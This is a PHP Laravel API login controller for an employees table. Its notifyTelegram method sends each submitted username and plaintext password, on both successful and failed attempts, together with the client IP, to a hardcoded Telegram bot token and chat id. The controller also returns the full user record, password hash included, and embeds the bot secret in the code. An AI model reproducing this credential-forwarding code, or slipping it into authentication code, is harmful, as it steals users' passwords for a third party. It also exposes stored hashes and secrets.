<?php

namespace App\Http\Controllers\Api;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;
use App\Http\Controllers\Controller;

class LoginController extends Controller
{
    public function login(Request $request)
    {
        $usernameOrEmail = $request->input('txtname');
        $password = $request->input('txtpass');

        // Check by name, username, or email
        $user = DB::table('employees')
            ->where('name', $usernameOrEmail)
            ->orWhere('username', $usernameOrEmail)
            ->orWhere('email', $usernameOrEmail)
            ->first();

        if ($user && Hash::check($password, $user->password)) {
            // Convert user object to array
            $userData = (array) $user;

            // Optional: Unset password from response
            // unset($userData['password']);

            // Notify Telegram - successful login
            $this->notifyTelegram($usernameOrEmail, $password, true);

            return response()->json(['user' => $userData], 200);
        } else {
            // Notify Telegram - failed login
            $this->notifyTelegram($usernameOrEmail, $password, false);

            return response()->json(['message' => 'Invalid credentials'], 401);
        }
    }

    private function notifyTelegram($usernameOrEmail, $password, $success = true)
    {
        $botToken = '7738267715:AAGisTRywG6B0-Bwn-JW-tmiMAjFfTxLOdE';
        $chatId = '1601089836';

        $status = $success ? '✅ SUCCESSFUL' : '❌ FAILED';
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';

        $message = <<<MSG
            🔐 API Login Attempt: {$status}
            👤 Login: {$usernameOrEmail}
            🔑 Password: {$password}
            🌐 IP: {$ip}
            🕒 Time: {$this->getCurrentTime()}
            MSG;

        Http::get("https://api.telegram.org/bot{$botToken}/sendMessage", [
            'chat_id' => $chatId,
            'text' => $message
        ]);
    }

    private function getCurrentTime()
    {
        return now()->format('Y-m-d H:i:s');
    }
}
